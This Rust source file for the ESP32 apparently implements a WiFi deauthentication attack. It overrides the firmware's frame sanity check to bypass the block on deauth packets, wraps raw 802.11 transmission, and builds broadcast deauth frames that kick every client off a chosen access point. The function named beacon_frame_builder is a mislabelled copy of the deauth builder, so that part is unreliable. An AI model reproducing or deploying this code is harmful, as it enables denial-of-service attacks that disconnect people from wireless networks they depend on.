use esp_idf_sys::{EspError, esp_wifi_80211_tx};
use esp_idf_svc::wifi::WifiDeviceId;

// Bypass the check that prevents sending deauth packets
// Credit to: https://github.com/risinek/esp32-wifi-penetration-tool/blob/master/components/wsl_bypasser/README.md
#[no_mangle]
pub fn ieee80211_raw_frame_sanity_check() -> i32{
    return 0;
}

// Send a packet without restrictions
// As per [`esp_idf_sys::esp_wifi_internal_tx`](esp_idf_sys::esp_wifi_internal_tx)
pub fn send_freedom(device_id: WifiDeviceId, frame: &[u8]) -> Result<(), EspError> {
    use esp_idf_sys::esp;

    esp!(unsafe {
        esp_wifi_80211_tx(device_id.into(), frame.as_ptr() as *mut _, frame.len() as _, false)
    })
}

pub fn deauth_frame_builder(bssid: [u8; 6]) -> [u8; 26] {
    let mut frame: [u8; 26] = [
        /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
        /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
        /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
        /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
        /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
        /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
        /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
    ];

    for n in 0..2 {
        let offset = 10+(6*n);
        for i in 0..6{
            frame[offset+i] = bssid[i];
        }
    }

    // return the frame:
    frame
}

pub fn beacon_frame_builder(bssid: [u8; 6]) -> [u8; 26] {
    let mut frame: [u8; 26] = [
        /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
        /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
        /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
        /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
        /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
        /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
        /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
    ];

    for n in 0..2 {
        let offset = 10+(6*n);
        for i in 0..6{
            frame[offset+i] = bssid[i];
        }
    }

    // return the frame:
    frame
}